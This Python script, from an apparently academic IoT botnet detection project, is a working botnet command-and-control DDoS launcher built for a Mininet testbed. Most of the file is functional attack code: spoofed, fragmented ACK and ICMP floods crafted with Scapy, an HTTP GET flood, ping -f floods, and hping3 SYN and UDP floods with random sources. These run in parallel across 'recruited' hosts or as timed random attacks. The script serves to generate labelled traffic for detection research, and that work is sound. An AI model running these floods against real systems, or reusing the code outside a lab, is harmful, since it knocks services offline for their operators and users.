#!/usr/bin/env python3
"""


FILE: cnc_trigger.py (DESIGNED FOR CICDDOSIOT2024 ATTACK TYPES)
PROJECT: ML-Assisted Detection of IoT Botnet DDoS Attacks: An Ensemble Learning Approach
AUTHOR: Kananelo Chabeli
DATE: 2024 - Updated 2026

DESCRIPTION:
    Command-and-Control (C&C) node that orchestrates botnet attacks.
    Supports 6 attack types from the CICDDoSIOT2024 dataset:

    1. ACK_FRAGMENTATION   - TCP ACK packets with IP fragmentation
    2. HTTP_FLOOD          - HTTP GET flood (Layer 7 application attack)
    3. ICMP_FLOOD          - ICMP Echo flood (ping bomb)
    4. ICMP_FRAGMENTATION  - ICMP with IP fragmentation
    5. SYN_FLOOD           - TCP SYN flood (classic Mirai attack)
    6. UDP_FLOOD           - UDP flood (classic Mirai attack)

    Can run:
      - Single attack mode: Launch one attack type for specified duration
      - Random attack mode: Launch random attacks at intervals (realistic botnet scenario)

    Logs all attack start/stop timestamps to logs/attack_timeline.log which is used by
    analyze_results.py to:
      - Compute detection latency
      - Evaluate ML model performance
      - Correlate with victim server logs

REQUIREMENTS:
    System packages:
      - sudo apt install hping3
    Python packages:
      - pip install scapy requests

USAGE (from Mininet CLI):
    # Single attack
    mininet> attacker python3 cnc_trigger.py --attack ACK_FRAGMENTATION --duration 60
    mininet> attacker python3 cnc_trigger.py --attack HTTP_FLOOD --target 192.168.3.1 --duration 45
    mininet> attacker python3 cnc_trigger.py --attack ICMP_FLOOD --duration 30

    # Random attacks at intervals (realistic botnet C&C behavior)
    mininet> attacker python3 cnc_trigger.py --attack random --max_attacks 4 \\
                                           --interval 20 --duration 30

    # Sequential attacks (for comprehensive testing)
    mininet> attacker bash -c 'for a in ACK_FRAGMENTATION HTTP_FLOOD ICMP_FLOOD; do \\
                                 python3 cnc_trigger.py --attack $a --duration 30; done'

DESIGN NOTES:
    - Uses Scapy for packet crafting (ACK, ICMP fragmentation)
    - Falls back to hping3 for SYN/UDP floods (more efficient, battle-tested)
    - HTTP flood uses requests library for realistic Layer-7 simulation
    - Each attack logs start/stop timestamps for ground-truth analysis
    - Random mode enables simulation of stealthy, time-distributed botnet C&C commands
"""

from datetime import datetime
import json
import subprocess
import socket
import time
import argparse
import os
import random
import sys
import threading
import multiprocessing
from typing import List


# Scapy: packet crafting for advanced attacks (fragmentation, ACK floods)
try:
    from scapy.all import IP, TCP, ICMP, send, fragment
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[⚠️  WARNING] Scapy not installed. Advanced attacks unavailable.")
    print("           Install with: pip install scapy")

# Requests: HTTP client for HTTP flood attacks (Layer 7)
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[⚠️  WARNING] Requests not installed. HTTP flood unavailable.")
    print("           Install with: pip install requests")
PYTHON = "/home/chabeli/.pyenv/shims/python3"  # Path to Python interpreter (adjust if needed)


LOG_DIR ='/home/chabeli/SDN_IoT/sdn-iot/logs'
os.makedirs(LOG_DIR, exist_ok=True)

# List of all available attack types
ATTACK_TYPES = [
    'ACK_FRAGMENTATION',      # TCP ACK with fragmentation
    'HTTP_FLOOD',             # Layer-7 HTTP GET flood(no longer supported)
    'ICMP_FLOOD',             # ICMP Echo flood
    'ICMP_FRAGMENTATION',     # ICMP with fragmentation
    'SYN_FLOOD',              # TCP SYN flood(no longer supported)
    'UDP_FLOOD',              # UDP flood
]

# For HTTP flood: default target port
HTTP_PORT = 80
ATTACK_DETAILS_FILE_CNC_TRIGGER = '/home/chabeli/SDN_IoT/sdn-iot/sim_results/attack_details_cnc_trigger.json'
SYN_FILENAME = '/home/chabeli/SDN_IoT/sdn-iot/syn.txt'


def print_banner(target, duration, attack_type):
    """
    Print fancy ASCII banner for attack start.

    Args:
        target: victim IP address
        duration: attack duration in seconds
        attack_type: one of ATTACK_TYPES
    """
    print('\n' + '=' * 75)
    print('BOTNET C&C ATTACK TRIGGER')
    print('=' * 75)
    print(f'  Attack Type  : {attack_type}')
    print(f'  Target       : {target}')
    print(f'  Duration     : {duration}s')
    print(f'  Time         : {time.strftime("%Y-%m-%d %H:%M:%S")}')
    print('=' * 75 + '\n')


def log_attack_start(attack_type, target, start_ts):
    """
    Log attack start to timeline file.
    Used by analyze_results.py to correlate with detection logs.

    Args:
        attack_type: name of attack
        target: victim IP
        start_ts: Unix timestamp of attack start
    """
    with open(os.path.join(LOG_DIR, 'attack_timeline.log'), 'a') as f:
        f.write(f'ATTACK_START  ts={start_ts:.3f}  type={attack_type:20s}  '
                f'target={target:15s}  time={time.strftime("%H:%M:%S")}\n')


def log_attack_stop(attack_type, start_ts, end_ts):
    """
    Log attack stop to timeline file.

    Args:
        attack_type: name of attack
        start_ts: Unix timestamp of attack start
        end_ts: Unix timestamp of attack stop
    """
    duration = end_ts - start_ts
    with open(os.path.join(LOG_DIR, 'attack_timeline.log'), 'a') as f:
        f.write(f'ATTACK_STOP   ts={end_ts:.3f}  type={attack_type:20s}  '
                f'duration={duration:7.1f}s\n')


def parse_botnet_list(botnet_spec: str) -> List[str]:
    """
    Parse botnet specification into list of host names.
    
    Supports multiple formats:
      - "N1-N10"     → ['N1', 'N2', ..., 'N10']
      - "N1,N2,N3"   → ['N1', 'N2', 'N3']
      - "N1"         → ['N1']

    Args:
        botnet_spec: string specification of botnet hosts

    Returns:
        List of host names

    Raises:
        ValueError if spec is invalid
    """
    if not botnet_spec:
        raise ValueError("Botnet specification empty")

    # Check if it's a range (e.g., "N1-N10")
    if '-' in botnet_spec and ',' not in botnet_spec:
        parts = botnet_spec.split('-')
        if len(parts) != 2:
            raise ValueError(f"Invalid range format: {botnet_spec}")
        
        try:
            # Parse "N1" and "N10" from "N1-N10"
            start_part = parts[0]  # e.g., "N1"
            end_part = parts[1]    # e.g., "N10"
            
            # Extract prefix and numbers
            start_prefix = ''.join([c for c in start_part if not c.isdigit()])
            start_num = int(''.join([c for c in start_part if c.isdigit()]))
            end_num = int(''.join([c for c in end_part if c.isdigit()]))
            
            if start_prefix != ''.join([c for c in end_part if not c.isdigit()]):
                raise ValueError(f"Prefix mismatch: {start_part} vs {end_part}")
            
            # Generate range
            hosts = [f'{start_prefix}{i}' for i in range(start_num, end_num + 1)]
            return hosts
        except ValueError as e:
            raise ValueError(f"Invalid range specification '{botnet_spec}': {e}")
    
    # Check if it's a comma-separated list
    elif ',' in botnet_spec:
        return [h.strip() for h in botnet_spec.split(',') if h.strip()]
    
    # Single host
    else:
        return [botnet_spec.strip()]


def get_host_ip(host_name: str) -> str:
    """
    Map Mininet host name to IP address.
    
    Follows the topology.py IP scheme:
      - N0-N4 on subnet 192.168.1.x
      - N5-N9 on subnet 192.168.2.x

    Args:
        host_name: host name (e.g., 'N0', 'N5')

    Returns:
        IP address in CIDR notation (e.g., '192.168.1.1')
    """
    try:
        # Extract number from name (e.g., "N5" → 5)
        num = int(''.join([c for c in host_name if c.isdigit()]))
        
        return rf'192.168.1.{num}'
    except (ValueError, IndexError) as e:
        raise ValueError(f"Cannot map host {host_name} to IP: {e}")


def recruit_bot_worker(host_name: str, host_ip: str, target: str, attack_type: str, duration: int):
    """
    Worker function for recruited bot host.
    Executes attack from perspective of recruited host using spoofed source IP.

    Args:
        host_name: name of recruited bot (e.g., 'N1')
        host_ip: IP address of recruited bot
        target: victim IP address
        attack_type: type of attack to launch
        duration: attack duration in seconds
    """
    print(f"[BOT {host_name}] Connecting to C&C... Recruited for {attack_type}")
    print(f"[BOT {host_name}] Executing attack from {host_ip} → {target}")
    
    # Log that this bot is participating
    with open(os.path.join(LOG_DIR, 'botnet_recruitment.log'), 'a') as f:
        f.write(f'BOT_RECRUITED  ts={time.time():.3f}  host={host_name}  '
                f'ip={host_ip}  attack={attack_type}  target={target}\n')
    
    # Launch attack with spoofed source IP (Scapy attacks) or default (hping3 attacks)
    if attack_type == 'ACK_FRAGMENTATION':
        attack_ack_fragmentation_spoofed(target, duration, host_ip)
    elif attack_type == 'HTTP_FLOOD':
        attack_http_flood(target, duration)  # HTTP sends from attacker's local IP
    elif attack_type == 'ICMP_FLOOD':
        attack_icmp_flood(target, duration)  # ICMP flood via ping
    elif attack_type == 'ICMP_FRAGMENTATION':
        attack_icmp_fragmentation_spoofed(target, duration, host_ip)
    elif attack_type == 'SYN_FLOOD':
        attack_syn_flood(target, duration)  # hping3 uses attacker's IP
    elif attack_type == 'UDP_FLOOD':
        attack_udp_flood(target, duration)  # hping3 can use random source IPs
    else:
        print(f"[BOT {host_name}] Unknown attack type: {attack_type}")


def attack_ack_fragmentation_spoofed(target, duration, source_ip=None):
    """
    TCP ACK flood with IP fragmentation using specified source IP.
    
    Args:
        target: victim IP address
        duration: attack duration in seconds
        source_ip: source IP to use (if None, uses random spoofed IPs)
    """
    if not SCAPY_AVAILABLE:
        print("❌ ACK_FRAG: Scapy required. Skipping.")
        return

    count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            # Use specified source IP or random spoofed IP
            if source_ip:
                src_ip = source_ip
            else:
                src_ip = f"192.168.{random.randint(1, 9)}.{random.randint(1, 255)}"
            
            sport = random.randint(1024, 65535)
            pkt = IP(src=src_ip, dst=target, flags='MF') / \
                  TCP(sport=sport, dport=80, flags='A', ack=random.randint(1000000, 9999999))
            
            send(pkt, verbose=0)
            count += 1

    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error in ACK_FRAGMENTATION_SPOOFED: {e}")


def attack_icmp_fragmentation_spoofed(target, duration, source_ip=None):
    """
    ICMP Echo flood with IP fragmentation using specified source IP.
    
    Args:
        target: victim IP address
        duration: attack duration in seconds
        source_ip: source IP to use (if None, uses random spoofed IPs)
    """
    if not SCAPY_AVAILABLE:
        print("❌ ICMP_FRAG: Scapy required. Skipping.")
        return

    count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            # Use specified source IP or random spoofed IP
            if source_ip:
                src_ip = source_ip
            else:
                src_ip = f"192.168.{random.randint(1, 9)}.{random.randint(1, 255)}"
            
            pkt = IP(src=src_ip, dst=target, flags='MF') / ICMP(type=8, code=0)
            send(pkt, verbose=0)
            count += 1

    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Error in ICMP_FRAGMENTATION_SPOOFED: {e}")


def run_distributed_attack(target: str, attack_type: str, botnet_hosts: List[str], duration: int,
                           attack_details: dict = None):
    """
    Orchestrate distributed attack across recruited botnet hosts.
    
    Spawns separate attack processes for each recruited bot, all running in parallel.
    Each bot sends traffic from its own source IP address.

    Args:
        target: victim IP address
        attack_type: type of attack (single type or 'random')
        botnet_hosts: list of recruited host names (e.g., ['N1', 'N2', 'N3'])
        duration: duration per attack in seconds
    """
    print('\n' + '=' * 75)
    print('  DISTRIBUTED BOTNET ATTACK — C&C RECRUITMENT MODE')
    print('=' * 75)
    print(f'  Victim Target      : {target}')
    print(f'  Attack Type        : {attack_type}')
    print(f'  Recruited Bots     : {len(botnet_hosts)} hosts')
    print(f'  Bot List           : {", ".join(botnet_hosts)}')
    print(f'  Duration Each      : {duration}s')
    print(f'  Execution          : Parallel (all bots attack simultaneously)')
    print('=' * 75 + '\n')
    
    # Map host names to IPs and validate
    bot_map = {}
    for host in botnet_hosts:
        try:
            ip = get_host_ip(host)
            bot_map[host] = ip
            print(f'  {host}, {ip}')
        except ValueError as e:
            print(f'  ❌ {host:10s} → ERROR: {e}')
            return
    
    print()
    
    # Create worker processes for each bot
    processes = []
    for host_name, host_ip in bot_map.items():
        # Each bot can get its own attack type (if random) or same type for all
        if attack_type == 'random':
            bot_attack = random.choice(ATTACK_TYPES)
        else:
            bot_attack = attack_type
        
        # Create process for this bot's attack
        proc = multiprocessing.Process(
            target=recruit_bot_worker,
            args=(host_name, host_ip, target, bot_attack, duration),
            name=f"bot_{host_name}"
        )
        processes.append(proc)
        proc.start()
        print(f'[C&C] Recruited {host_name} for {bot_attack}')
        time.sleep(0.5)  # Stagger recruitment slightly
    
    print(f'\n[C&C] All {len(processes)} bots recruited. Attacks running in parallel...')
    print(f'[C&C] Waiting {duration}s for attacks to complete...\n')
    
    # Wait for all processes to complete
    for proc in processes:
        proc.join(timeout=duration + 10)  # Give extra time for cleanup
        if proc.is_alive():
            proc.terminate()
            proc.join(timeout=5)
    
    if attack_details:
        attack_details[attack_type]['traffic_end'] = datetime.now().isoformat()
        
        json.dump(attack_details, open(ATTACK_DETAILS_FILE_CNC_TRIGGER, 'w'), indent=4)
    
    print('\n' + '=' * 75)
    print(f'[C&C] All bots reported completion. Distributed attack finished.')
    print('=' * 75 + '\n')
    
    # Log recruitment completion
    with open(os.path.join(LOG_DIR, 'botnet_recruitment.log'), 'a') as f:
        f.write(f'ATTACK_COMPLETE  ts={time.time():.3f}  bots={len(bot_map)}  '
                f'attack={attack_type}  target={target}\n')
    
    with open(SYN_FILENAME, 'w') as f:
        f.write('SIMULATION\n')
        f.write(f'BENIGN\n')


def attack_ack_fragmentation(target, duration):
    """
    TCP ACK flood with IP fragmentation.

    Sends TCP ACK packets with the MF (More Fragments) flag set, causing
    the victim to reassemble fragmented packets unnecessarily. Realistic
    variant of fragmentation attacks in CICDDoSIOT2024.

    Requires: Scapy (for packet crafting)

    Args:
        target: victim IP address
        duration: attack duration in seconds
    """
    if not SCAPY_AVAILABLE:
        print("❌ [ACK_FRAG] Scapy required. Skipping.")
        return

    print(f"[C&C] Launching ACK_FRAGMENTATION attack on {target}...")
    start_ts = time.time()
    log_attack_start('ACK_FRAGMENTATION', target, start_ts)

    count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            # Random source IP (spoofed) and port
            src_ip = f"192.168.{random.randint(1, 9)}.{random.randint(1, 255)}"
            sport = random.randint(1024, 65535)

            # Craft fragmented TCP ACK
            # - IP flags='MF' = More Fragments (enables reassembly)
            # - TCP flags='A' = ACK flag set
            pkt = IP(src=src_ip, dst=target, flags='MF') / \
                  TCP(sport=sport, dport=80, flags='A', ack=random.randint(1000000, 9999999))

            # Send without verbose output
            send(pkt, verbose=0)
            count += 1

            # Progress indicator every 100 packets
            if count % 100 == 0:
                print(f"  [{count:6d}] ACK fragments sent...")

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")

    finally:
        end_ts = time.time()
        log_attack_stop('ACK_FRAGMENTATION', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ ACK_FRAGMENTATION complete.")
        print(f"      Packets: {count}, Duration: {elapsed:.1f}s, "
              f"Rate: {count/elapsed:.0f} pkt/s\n")


def attack_http_flood(target, duration, port=HTTP_PORT):
    """
    HTTP GET flood (Layer 7 application attack).

    Sends repeated HTTP GET requests to exhaust server resources.
    Simulates realistic botnet HTTP flood variant.

    Requires: requests library

    Args:
        target: victim IP address
        duration: attack duration in seconds
        port: HTTP server port (default 80)
    """
    if not REQUESTS_AVAILABLE:
        print("❌ [HTTP_FLOOD] Requests library required. Skipping.")
        return

    print(f"[C&C] Launching HTTP_FLOOD attack on {target}:{port}...")
    start_ts = time.time()
    log_attack_start('HTTP_FLOOD', target, start_ts)

    count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            try:
                # Send HTTP GET request with short timeout
                url = f'http://{target}:{port}/'
                requests.get(url, timeout=1)
                count += 1

                # Progress indicator every 50 requests
                if count % 50 == 0:
                    print(f"  [{count:6d}] HTTP GETs sent...")

            except requests.exceptions.RequestException:
                # Connection refused, timeout, etc. — just continue
                # (victim may be overwhelmed)
                pass

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")

    finally:
        end_ts = time.time()
        log_attack_stop('HTTP_FLOOD', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ HTTP_FLOOD complete.")
        print(f"      Requests: {count}, Duration: {elapsed:.1f}s, "
              f"Rate: {count/elapsed:.0f} req/s\n")


def attack_icmp_flood(target, duration):
    """
    ICMP Echo flood (ping bomb).

    Uses system 'ping -f' to send continuous ICMP Echo requests.
    Fast and effective; high packet rate. Realistic botnet variant.

    Requires: hping3 not strictly needed; ping -f works on most systems

    Args:
        target: victim IP address
        duration: attack duration in seconds
    """
    print(f"[C&C] Launching ICMP_FLOOD attack on {target}...")
    start_ts = time.time()
    log_attack_start('ICMP_FLOOD', target, start_ts)

    # ping -f = flood mode (send packets as fast as possible)
    cmd = ['ping', '-f', target]
    print(f"[C&C] Running: {' '.join(cmd)}")

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, preexec_fn=os.setsid  # Create process group for clean kill
        )
        
        if duration > 0:
            time.sleep(duration)
            # Kill the entire process group (ping + child processes)
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except ProcessLookupError:
                proc.terminate()
        else:
            # Run until interrupted
            proc.wait()

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")
        try:
            os.killpg(os.getpgid(proc.pid), 9)
        except ProcessLookupError:
            proc.terminate()

    finally:
        end_ts = time.time()
        log_attack_stop('ICMP_FLOOD', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ ICMP_FLOOD complete.")
        print(f"      Duration: {elapsed:.1f}s\n")


def attack_icmp_fragmentation(target, duration):
    """
    ICMP Echo flood with IP fragmentation.

    Sends ICMP Echo requests with IP fragmentation enabled (MF flag).
    Causes victim to reassemble fragmented ICMP packets, wasting CPU.

    Requires: Scapy

    Args:
        target: victim IP address
        duration: attack duration in seconds
    """
    if not SCAPY_AVAILABLE:
        print("❌ [ICMP_FRAG] Scapy required. Skipping.")
        return

    print(f"[C&C] Launching ICMP_FRAGMENTATION attack on {target}...")
    start_ts = time.time()
    log_attack_start('ICMP_FRAGMENTATION', target, start_ts)

    count = 0
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            # Random source IP (spoofed)
            src_ip = f"192.168.{random.randint(1, 9)}.{random.randint(1, 255)}"

            # Craft fragmented ICMP Echo packet
            # type=8 (Echo request), code=0
            pkt = IP(src=src_ip, dst=target, flags='MF') / \
                  ICMP(type=8, code=0)

            send(pkt, verbose=0)
            count += 1

            # Progress indicator every 100 packets
            if count % 100 == 0:
                print(f"  [{count:6d}] ICMP fragments sent...")

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")

    finally:
        end_ts = time.time()
        log_attack_stop('ICMP_FRAGMENTATION', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ ICMP_FRAGMENTATION complete.")
        print(f"      Packets: {count}, Duration: {elapsed:.1f}s, "
              f"Rate: {count/elapsed:.0f} pkt/s\n")



def attack_syn_flood(target, duration):
    """
    TCP SYN flood attack.

    Uses hping3 to send TCP SYN packets in flood mode.
    Classic Mirai botnet attack. Exhausts victim's half-open connection table.

    Requires: hping3

    Args:
        target: victim IP address
        duration: attack duration in seconds
    """
    cmd = ['hping3', '--syn', '--flood', '-V', '-p', '80', target]
    print(f"[C&C] Launching SYN_FLOOD attack on {target}...")
    print(f"[C&C] Running: {' '.join(cmd)}")

    start_ts = time.time()
    log_attack_start('SYN_FLOOD', target, start_ts)

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, preexec_fn=os.setsid
        )

        if duration > 0:
            time.sleep(duration)
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except ProcessLookupError:
                proc.terminate()
        else:
            proc.wait()

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")
        try:
            os.killpg(os.getpgid(proc.pid), 9)
        except ProcessLookupError:
            proc.terminate()

    finally:
        end_ts = time.time()
        log_attack_stop('SYN_FLOOD', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ SYN_FLOOD complete.")
        print(f"      Duration: {elapsed:.1f}s\n")

def attack_udp_flood(target, duration):
    """
    UDP flood attack.

    Uses hping3 to send UDP packets in flood mode with random source IPs.
    Classic Mirai botnet attack. Exhausts victim bandwidth.

    Requires: hping3

    Args:
        target: victim IP address
        duration: attack duration in seconds
    """
    cmd = ['hping3', '--udp', '--flood', '-V', '--rand-source', '--rand-dest', target]
    print(f"[C&C] Launching UDP_FLOOD attack on {target}...")
    print(f"[C&C] Running: {' '.join(cmd)}")

    start_ts = time.time()
    log_attack_start('UDP_FLOOD', target, start_ts)

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, preexec_fn=os.setsid
        )

        if duration > 0:
            time.sleep(duration)
            try:
                os.killpg(os.getpgid(proc.pid), 9)
            except ProcessLookupError:
                proc.terminate()
        else:
            proc.wait()

    except KeyboardInterrupt:
        print("\n[C&C] Interrupted by user.")
        try:
            os.killpg(os.getpgid(proc.pid), 9)
        except ProcessLookupError:
            proc.terminate()

    finally:
        end_ts = time.time()
        log_attack_stop('UDP_FLOOD', start_ts, end_ts)
        elapsed = end_ts - start_ts
        print(f"[C&C] ✓ UDP_FLOOD complete.")
        print(f"      Duration: {elapsed:.1f}s\n")


def run_attack(target, attack_type, duration):
    """
    Dispatch to the correct attack handler based on attack_type.

    Args:
        target: victim IP address
        attack_type: one of ATTACK_TYPES
        duration: attack duration in seconds

    Raises:
        SystemExit if attack_type unknown
    """
    attack_map = {
        'ACK_FRAGMENTATION': attack_ack_fragmentation,
        'HTTP_FLOOD': attack_http_flood,
        'ICMP_FLOOD': attack_icmp_flood,
        'ICMP_FRAGMENTATION': attack_icmp_fragmentation,
        'SYN_FLOOD': attack_syn_flood,
        'UDP_FLOOD': attack_udp_flood,
    }

    if attack_type not in attack_map:
        print(f"❌ Unknown attack type: {attack_type}")
        print(f"Available attacks: {', '.join(ATTACK_TYPES)}")
        sys.exit(1)

    print_banner(target, duration, attack_type)
    attack_map[attack_type](target, duration)


def run_random_attacks(target, num_attacks, interval, duration_per_attack):
    """
    Launch a series of random attacks at regular intervals.
    Simulates realistic C&C behavior: stealthy, time-distributed commands.

    Args:
        target: victim IP address
        num_attacks: total number of attacks to launch
        interval: seconds between attack starts
        duration_per_attack: duration of each individual attack
    """
    print('\n' + '=' * 75)
    print('  RANDOM ATTACK MODE (Stealthy C&C Behavior)')
    print('=' * 75)
    print(f'  Total Attacks      : {num_attacks}')
    print(f'  Interval           : {interval}s (between attack starts)')
    print(f'  Duration Each      : {duration_per_attack}s')
    print(f'  Estimated Total    : ~{(num_attacks-1)*interval + duration_per_attack}s')
    print('=' * 75 + '\n')

    for i in range(num_attacks):
        # Pick random attack
        attack_type = random.choice(ATTACK_TYPES)
        print(f'\n🎲 [Attack {i+1}/{num_attacks}] Rolling dice... got: {attack_type}')
        print(f'   Starting in 3s...')
        time.sleep(3)

        try:
            run_attack(target, attack_type, duration_per_attack)
        except Exception as e:
            print(f"⚠️  [Attack {i+1}] Failed with error: {e}")

        # Wait before next attack (except after last one)
        if i < num_attacks - 1:
            print(f'\n⏸️  Cooldown {interval}s before next attack...')
            time.sleep(interval)

    print('\n' + '=' * 75)
    print('  ALL RANDOM ATTACKS COMPLETED')
    print('=' * 75 + '\n')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='IoT Botnet C&C Attack Trigger',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  ═══════════════════════════════════════════════════════════════════════

  SINGLE ATTACK (from attacker node only):
    python3 cnc_trigger.py --attack ACK_FRAGMENTATION --duration 60
    python3 cnc_trigger.py --attack HTTP_FLOOD --target 192.168.3.1 --duration 45
    python3 cnc_trigger.py --attack ICMP_FLOOD --duration 30

  ═══════════════════════════════════════════════════════════════════════

  DISTRIBUTED BOTNET ATTACKS (recruit multiple nodes):
  
    # Recruit N1-N5 for coordinated SYN flood
    python3 cnc_trigger.py --recruit --botnet N1-N5 --attack SYN_FLOOD --duration 60
    
    # Recruit specific hosts with different attack
    python3 cnc_trigger.py --recruit --botnet N1,N3,N5,N7 --attack HTTP_FLOOD --duration 45
    
    # Recruit all 10 IoT devices for random attacks
    python3 cnc_trigger.py --recruit --botnet N0-N9 --attack random --duration 30
    
    # Recruit N0-N9 for ICMP fragmentation flood
    python3 cnc_trigger.py --recruit --botnet N0-N9 --attack ICMP_FRAGMENTATION --duration 60

  ═══════════════════════════════════════════════════════════════════════

  RANDOM ATTACK MODE (stealthy C&C behavior):
    python3 cnc_trigger.py --attack random --max_attacks 5 --interval 20 --duration 30
    python3 cnc_trigger.py --recruit --botnet N0-N9 --attack random --max_attacks 3

  ═══════════════════════════════════════════════════════════════════════

  SEQUENTIAL ATTACKS (comprehensive testing):
    for attack in ACK_FRAGMENTATION HTTP_FLOOD ICMP_FLOOD ICMP_FRAGMENTATION SYN_FLOOD UDP_FLOOD; do
      python3 cnc_trigger.py --recruit --botnet N0-N9 --attack $attack --duration 20
      sleep 5
    done
        """)

    parser.add_argument(
        '--target',
        default='192.168.1.11',
        help='Target (victim) IP address (default: 192.168.1.11)'
    )

    parser.add_argument(
        '--attack',
        default='SYN_FLOOD',
        choices=ATTACK_TYPES + ['random'],
        help='Attack type, or "random" (default: SYN_FLOOD)'
    )

    parser.add_argument(
        '--duration',
        default=30,
        type=int,
        help='Duration per attack in seconds (default: 30)'
    )

    parser.add_argument(
        '--interval',
        default=10,
        type=int,
        help='Interval between random attacks in seconds (default: 10)'
    )

    parser.add_argument(
        '--max_attacks',
        default=3,
        type=int,
        help='Number of random attacks to launch (default: 3)'
    )

    parser.add_argument(
        '--recruit',
        action='store_true',
        help='Enable botnet recruitment mode (attack from multiple hosts)'
    )

    parser.add_argument(
        '--botnet',
        default='N0-N9',
        help='Botnet hosts to recruit (e.g., "N0-N9", "N1,N3,N5", "N2-N4"). '
             'Default: all 10 nodes N0-N9. Only used with --recruit.'
    )

    parser.add_argument(
        '--dataset',
        action='store_true',
        help='Optional that instructs the cnc_trigger to write each attack type to /home/chabeli/SDN_IoT/sdn-iot/syn.txt for dataset collect stage.). '
    )

    args = parser.parse_args()


    print()
    if not SCAPY_AVAILABLE:
        print("⚠️  WARNING: Some attacks require Scapy.")
        print("   Install: pip install scapy\n")

    if not REQUESTS_AVAILABLE:
        print("⚠️  WARNING: HTTP flood requires requests library.")
        print("   Install: pip install requests\n")


    attack_details = {}
    if args.dataset:
        with open(SYN_FILENAME, 'w') as f:
            f.write(f'DATASET\n')
            f.write(f'{args.attack}\n')
    else:
        with open(SYN_FILENAME, 'w') as f:
            f.write('SIMULATION\n')
            f.write(f'{args.attack}\n')
    if args.recruit:
        # RECRUITMENT MODE: Attack from multiple botnet hosts in parallel
        try:
            with open(ATTACK_DETAILS_FILE_CNC_TRIGGER, 'r') as f:
                attack_details = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f'\n❌ Error reading attack details, attacks will not be logged... {e}')
        if attack_details:
            print(f'\n[INFO] Loaded attack details for dataset collection. Logging {args.attack} start time...')
            if args.attack in attack_details:
                attack_details[args.attack]['traffic_start'] = datetime.now().isoformat()
            else:
                attack_details[args.attack] = {
                    'traffic_start': datetime.now().isoformat(),
                    'traffic_end': None
                }
        try:
            botnet_hosts = parse_botnet_list(args.botnet)
            print(f'\n[C&C] Recruiting {len(botnet_hosts)} botnet hosts...')
            print(f'[C&C] Botnet: {botnet_hosts}\n')
            
            run_distributed_attack(
                target=args.target,
                attack_type=args.attack,
                botnet_hosts=botnet_hosts,
                duration=args.duration,
                attack_details=attack_details
            )

        except ValueError as e:
            print(f'\n❌ Recruitment error: {e}')
            sys.exit(1)
        
        
    elif args.attack == 'random':
        # RANDOM ATTACK MODE: Single attacker, random attack sequence
        run_random_attacks(
            args.target,
            args.max_attacks,
            args.interval,
            args.duration
        )
    else:
        # SINGLE ATTACK MODE: Single attacker, single attack type
        run_attack(args.target, args.attack, args.duration)
    
